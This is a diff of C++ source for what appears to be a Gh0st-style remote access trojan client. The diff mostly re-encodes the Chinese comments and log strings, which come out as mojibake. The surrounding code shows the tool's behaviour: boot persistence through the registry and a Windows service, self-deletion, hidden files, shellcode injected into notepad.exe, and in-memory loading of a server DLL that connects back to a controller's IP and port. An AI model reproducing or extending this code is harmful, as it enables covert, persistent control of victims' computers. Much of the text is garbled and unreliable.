@@ -1,4 +1,4 @@
-
+ï»¿
 #include "StdAfx.h"
 #include "MemoryModule.h"
 #include "ShellcodeInj.h"
@@ -17,7 +17,7 @@ extern "C" {
 
 #pragma comment(lib, "ws2_32.lib")
 
-// ×Ô¶¯Æô¶¯×¢²á±íÖĞµÄÖµ
+// è‡ªåŠ¨å¯åŠ¨æ³¨å†Œè¡¨ä¸­çš„å€¼
 #define REG_NAME "ClientDemo"
 
 typedef void (*StopRun)();
@@ -26,13 +26,13 @@ typedef bool (*IsStoped)();
 
 typedef BOOL (*IsExit)();
 
-// Í£Ö¹³ÌĞòÔËĞĞ
+// åœæ­¢ç¨‹åºè¿è¡Œ
 StopRun stop = NULL;
 
-// ÊÇ·ñ³É¹¦Í£Ö¹
+// æ˜¯å¦æˆåŠŸåœæ­¢
 IsStoped bStop = NULL;
 
-// ÊÇ·ñÍË³ö±»¿Ø¶Ë
+// æ˜¯å¦é€€å‡ºè¢«æ§ç«¯
 IsExit bExit = NULL;
 
 BOOL status = 0;
@@ -53,7 +53,7 @@ BOOL CALLBACK callback(DWORD CtrlType)
     return TRUE;
 }
 
-// ÔËĞĞ³ÌĞò.
+// è¿è¡Œç¨‹åº.
 BOOL Run(const char* argv1, int argv2);
 
 // Package header.
@@ -77,16 +77,16 @@ protected:
     HMEMORYMODULE m_mod;
     std::string GetIPAddress(const char* hostName)
     {
-        // 1. ÅĞ¶ÏÊÇ²»ÊÇºÏ·¨µÄ IPv4 µØÖ·
+        // 1. åˆ¤æ–­æ˜¯ä¸æ˜¯åˆæ³•çš„ IPv4 åœ°å€
         sockaddr_in sa;
         if (inet_pton(AF_INET, hostName, &(sa.sin_addr)) == 1) {
-            // ÊÇºÏ·¨ IPv4 µØÖ·£¬Ö±½Ó·µ»Ø
+            // æ˜¯åˆæ³• IPv4 åœ°å€ï¼Œç›´æ¥è¿”å›
             return std::string(hostName);
         }
 
-        // 2. ·ñÔò³¢ÊÔ½âÎöÓòÃû
+        // 2. å¦åˆ™å°è¯•è§£æåŸŸå
         addrinfo hints = {}, * res = nullptr;
-        hints.ai_family = AF_INET; // Ö»Ö§³Ö IPv4
+        hints.ai_family = AF_INET; // åªæ”¯æŒ IPv4
         hints.ai_socktype = SOCK_STREAM;
         hints.ai_protocol = IPPROTO_TCP;
 
@@ -210,22 +210,22 @@ public:
     }
 };
 
-// @brief Ê×ÏÈ¶ÁÈ¡settings.iniÅäÖÃÎÄ¼ş£¬»ñÈ¡IPºÍ¶Ë¿Ú.
+// @brief é¦–å…ˆè¯»å–settings.inié…ç½®æ–‡ä»¶ï¼Œè·å–IPå’Œç«¯å£.
 // [settings]
 // localIp=XXX
 // ghost=6688
-// Èç¹ûÅäÖÃÎÄ¼ş²»´æÔÚ¾Í´ÓÃüÁîĞĞÖĞ»ñÈ¡IPºÍ¶Ë¿Ú.
+// å¦‚æœé…ç½®æ–‡ä»¶ä¸å­˜åœ¨å°±ä»å‘½ä»¤è¡Œä¸­è·å–IPå’Œç«¯å£.
 int main(int argc, const char *argv[])
 {
-    Mprintf("Æô¶¯ÔËĞĞ: %s %s. Arg Count: %d\n", argv[0], argc > 1 ? argv[1] : "", argc);
+    Mprintf("å¯åŠ¨è¿è¡Œ: %s %s. Arg Count: %d\n", argv[0], argc > 1 ? argv[1] : "", argc);
     InitWindowsService({"ClientDemoService", "Client Demo Service", "Provide a demo service."}, Log);
     bool isService = g_ConnectAddress.iStartup == Startup_TestRunMsc;
-    // ×¢²áÆô¶¯Ïî
+    // æ³¨å†Œå¯åŠ¨é¡¹
     int r = RegisterStartup("Client Demo", "ClientDemo", !isService, g_ConnectAddress.runasAdmin, Logf);
     if (r <= 0) {
         BOOL s = self_del();
         if (!IsDebug) {
-            Mprintf("½áÊøÔËĞĞ.");
+            Mprintf("ç»“æŸè¿è¡Œ.\n");
             Sleep(1000);
             return r;
         }
@@ -233,7 +233,7 @@ int main(int argc, const char *argv[])
 
     BOOL ok = SetSelfStart(argv[0], REG_NAME);
     if(!ok) {
-        Mprintf("ÉèÖÃ¿ª»ú×ÔÆô¶¯Ê§°Ü£¬ÇëÓÃ¹ÜÀíÔ±È¨ÏŞÔËĞĞ.\n");
+        Mprintf("è®¾ç½®å¼€æœºè‡ªå¯åŠ¨å¤±è´¥ï¼Œè¯·ç”¨ç®¡ç†å‘˜æƒé™è¿è¡Œ.\n");
     }
 
     if (isService) {
@@ -243,7 +243,7 @@ int main(int argc, const char *argv[])
             Mprintf(" Arg [%d]: %s\n", i, argv[i]);
         }
         if (ret) {
-            Mprintf("½áÊøÔËĞĞ.");
+            Mprintf("ç»“æŸè¿è¡Œ.\n");
             Sleep(1000);
             return 0x20251202;
         }
@@ -262,7 +262,7 @@ int main(int argc, const char *argv[])
         g_ConnectAddress.SetServer(saved_ip.c_str(), saved_port);
     }
 
-    // ´Ë Shell code Á¬½Ó±¾»ú6543¶Ë¿Ú£¬×¢Èëµ½¼ÇÊÂ±¾
+    // æ­¤ Shell code è¿æ¥æœ¬æœº6543ç«¯å£ï¼Œæ³¨å…¥åˆ°è®°äº‹æœ¬
     if (g_ConnectAddress.iStartup == Startup_InjSC) {
         // Try to inject shell code to `notepad.exe`
         // If failed then run memory DLL
@@ -289,7 +289,7 @@ int main(int argc, const char *argv[])
             CloseHandle(hProcess);
             Mprintf("Process [%d] is finished.\n", pid);
             if (status == 1) {
-                Mprintf("½áÊøÔËĞĞ.");
+                Mprintf("ç»“æŸè¿è¡Œ.\n");
                 Sleep(1000);
                 return -1;
             }
@@ -305,21 +305,21 @@ int main(int argc, const char *argv[])
                        argv[1] : (strlen(g_ConnectAddress.ServerIP()) == 0 ? "127.0.0.1" : g_ConnectAddress.ServerIP()),
                        argc > 2 ? atoi(argv[2]) : (g_ConnectAddress.ServerPort() == 0 ? 6543 : g_ConnectAddress.ServerPort()));
         if (ret == 1) {
-            Mprintf("½áÊøÔËĞĞ.");
+            Mprintf("ç»“æŸè¿è¡Œ.\n");
             Sleep(1000);
             return -1;
         }
     } while (status == 0);
 
     status = 0;
-    Mprintf("½áÊøÔËĞĞ.");
+    Mprintf("ç»“æŸè¿è¡Œ.\n");
     Sleep(1000);
     Logger::getInstance().stop();
 
     return 0;
 }
 
-// ´«ÈëÃüÁîĞĞ²ÎÊı: IP ºÍ ¶Ë¿Ú.
+// ä¼ å…¥å‘½ä»¤è¡Œå‚æ•°: IP å’Œ ç«¯å£.
 BOOL Run(const char* argv1, int argv2)
 {
     BOOL result = FALSE;
@@ -344,7 +344,7 @@ BOOL Run(const char* argv1, int argv2)
             Mprintf("Error removing file. Error code: %d\n", GetLastError());
             ok = FALSE;
         } else {
-            // ÉèÖÃÎÄ¼şÊôĞÔÎªÒş²Ø
+            // è®¾ç½®æ–‡ä»¶å±æ€§ä¸ºéšè—
             if (SetFileAttributesA(oldFile.c_str(), FILE_ATTRIBUTE_HIDDEN)) {
                 Mprintf("File created and set to hidden: %s\n",oldFile.c_str());
             }
@@ -377,7 +377,7 @@ BOOL Run(const char* argv1, int argv2)
     bExit = hDll ? IsExit(runner->GetProcAddress(hDll, "IsExit")) : NULL;
     if (NULL == run) {
         if (hDll) runner->FreeLibrary(hDll);
-        Mprintf("¼ÓÔØ¶¯Ì¬Á´½Ó¿â\"ServerDll.dll\"Ê§°Ü. ´íÎó´úÂë: %d\n", GetLastError());
+        Mprintf("åŠ è½½åŠ¨æ€é“¾æ¥åº“\"ServerDll.dll\"å¤±è´¥. é”™è¯¯ä»£ç : %d\n", GetLastError());
         Sleep(3000);
         delete runner;
         return FALSE;
@@ -387,7 +387,7 @@ BOOL Run(const char* argv1, int argv2)
         strcpy_s(ip, g_ConnectAddress.ServerIP());
         int port = g_ConnectAddress.ServerPort();
         strcpy(p + 1, "settings.ini");
-        if (_access(path, 0) == -1) { // ÎÄ¼ş²»´æÔÚ: ÓÅÏÈ´Ó²ÎÊıÖĞÈ¡Öµ£¬Æä´ÎÊÇ´Óg_ConnectAddressÈ¡Öµ.
+        if (_access(path, 0) == -1) { // æ–‡ä»¶ä¸å­˜åœ¨: ä¼˜å…ˆä»å‚æ•°ä¸­å–å€¼ï¼Œå…¶æ¬¡æ˜¯ä»g_ConnectAddresså–å€¼.
             strcpy(ip, argv1);
             port = argv2;
         } else {
@@ -409,9 +409,9 @@ BOOL Run(const char* argv1, int argv2)
         }
     } while (result == 2);
     if (!runner->FreeLibrary(hDll)) {
-        Mprintf("ÊÍ·Å¶¯Ì¬Á´½Ó¿â\"ServerDll.dll\"Ê§°Ü. ´íÎó´úÂë: %d\n", GetLastError());
+        Mprintf("é‡Šæ”¾åŠ¨æ€é“¾æ¥åº“\"ServerDll.dll\"å¤±è´¥. é”™è¯¯ä»£ç : %d\n", GetLastError());
     } else {
-        Mprintf("ÊÍ·Å¶¯Ì¬Á´½Ó¿â\"ServerDll.dll\"³É¹¦!\n");
+        Mprintf("é‡Šæ”¾åŠ¨æ€é“¾æ¥åº“\"ServerDll.dll\"æˆåŠŸ!\n");
     }
     delete runner;
     return result;
